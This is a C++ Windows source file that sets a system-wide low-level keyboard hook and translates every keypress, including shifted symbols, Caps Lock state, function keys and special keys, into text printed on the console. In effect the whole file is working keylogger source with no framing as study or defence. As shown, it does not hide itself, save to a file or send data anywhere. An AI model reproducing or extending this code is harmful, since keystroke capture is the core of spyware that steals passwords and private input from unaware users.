#include "stdafx.h"
#include <fstream>
#include <iostream>
#include <Windows.h>
#include <stdio.h>

using namespace std;

bool isCapsLockOn()
{
	if ((GetKeyState(VK_CAPITAL) & 1) != 0)
		return true;
	return false;
}

void getKeyString(DWORD vkCode)
{
	if (vkCode >= 0x30 && vkCode <= 0x39) // 0 - 9 with shift options
	{
		switch (vkCode)
		{
		case 0x30: if (GetAsyncKeyState(VK_SHIFT)) cout << ')'; else cout << '0'; break;
		case 0x31: if (GetAsyncKeyState(VK_SHIFT)) cout << '!'; else cout << '1'; break;
		case 0x32: if (GetAsyncKeyState(VK_SHIFT)) cout << '@'; else cout << '2'; break;
		case 0x33: if (GetAsyncKeyState(VK_SHIFT)) cout << '#'; else cout << '3'; break;
		case 0x34: if (GetAsyncKeyState(VK_SHIFT)) cout << '$'; else cout << '4'; break;
		case 0x35: if (GetAsyncKeyState(VK_SHIFT)) cout << '%'; else cout << '5'; break;
		case 0x36: if (GetAsyncKeyState(VK_SHIFT)) cout << '^'; else cout << '6'; break;
		case 0x37: if (GetAsyncKeyState(VK_SHIFT)) cout << '&'; else cout << '7'; break;
		case 0x38: if (GetAsyncKeyState(VK_SHIFT)) cout << '*'; else cout << '8'; break;
		case 0x39: if (GetAsyncKeyState(VK_SHIFT)) cout << '('; else cout << '9'; break;
		}
	}

	else if (vkCode >= 0x41 && vkCode <= 0x5A) // a - z
	{
		if (!(GetAsyncKeyState(VK_SHIFT) ^ isCapsLockOn()))
			cout << (char)tolower(vkCode);
		else
			cout << (char)vkCode;
	}

	else if (vkCode >= 0x70 && vkCode <= 0x7B) // F1 - F12.
	{
		cout << "[F" << vkCode - 111 << ']';
	}

	else if (vkCode) // special
	{
		switch (vkCode)
		{
		case VK_RETURN: cout << "<ENTER>"; break;
		case VK_CAPITAL: cout << "<CAPLOCK>"; break;
		case VK_LCONTROL: cout << "<LCTRL>"; break;
		case VK_RCONTROL: cout << "<RCTRL>"; break;
		case VK_INSERT: cout << "<INSERT>"; break;
		case VK_END: cout << "<END>"; break;
		case VK_PRINT: cout << "<PRINT>"; break;
		case VK_DELETE: cout << "<DEL>"; break;
		case VK_BACK: cout << "<BK>"; break;
		case VK_LEFT: cout << "<LEFT>"; break;
		case VK_RIGHT: cout << "<RIGHT>"; break;
		case VK_UP: cout << "<UP>"; break;
		case VK_DOWN: cout << "<DOWN>"; break;
		case VK_SPACE: cout << ' '; break;
		case VK_ESCAPE: cout << "<ESC>"; break;
		case VK_TAB: cout << "<TAB>"; break;
		case VK_LWIN: cout << "<LWIN>"; break;
		case VK_RWIN: cout << "<RWIN>"; break;
		}
	}
}

void handleKey(DWORD vkCode)
{
	getKeyString(vkCode);
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	PKBDLLHOOKSTRUCT p = reinterpret_cast<PKBDLLHOOKSTRUCT>(lParam);

	if (wParam == WM_KEYDOWN)
	{
		handleKey(p->vkCode);
	}

	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main()
{
	HHOOK keyBoard = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, NULL);
	MSG msg;

	while (!GetMessage(&msg, NULL, NULL, NULL))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	UnhookWindowsHookEx(keyBoard);
}